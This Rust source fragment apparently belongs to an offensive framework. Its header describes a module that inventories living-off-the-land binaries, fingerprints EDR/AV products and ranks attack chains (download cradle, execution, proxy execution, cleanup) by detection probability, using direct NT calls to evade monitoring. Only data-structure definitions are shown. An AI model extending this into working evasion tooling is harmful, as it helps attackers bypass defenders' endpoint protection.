// Source: dark_crystal/crowd/src/kaguya.rs
// Technique: T016 - Kaguya (Living-Off-The-Land-as-Code)
// Tier: A
//
// Inventories LOtL binaries, detects EDR/AV products, generates ranked
// execution chains with detection probability scores.
// All file checks use NtOpenFile via RecycledGate. Process enum uses
// NtQuerySystemInformation class 5. No Win32 API calls.

#[derive(Debug, Clone)]
pub struct LotlBinary {
    pub name: &'static str,
    pub path: String,
    pub available: bool,
    pub blocked: bool,
    pub version: Option<String>,
}

#[derive(Debug, Clone)]
pub struct EdrProduct {
    pub name: &'static str,
    pub process_name: &'static str,
    pub process_hash: u32,       // DJB2 hash for fast lookup
    pub detected: bool,
    pub kernel_driver: bool,
}

#[derive(Debug, Clone)]
pub struct EdrProfile {
    pub products: Vec<EdrProduct>,
    pub amsi_loaded: bool,
    pub etw_providers: Vec<u32>,
    pub applocker_active: bool,
    pub wdac_active: bool,
}

#[derive(Debug, Clone)]
pub struct LotlChain {
    pub download_cradle: Option<LotlTechnique>,
    pub execution: LotlTechnique,
    pub proxy_exec: Option<LotlTechnique>,
    pub cleanup: Option<LotlTechnique>,
    pub total_score: f64,        // Composite detection probability
}
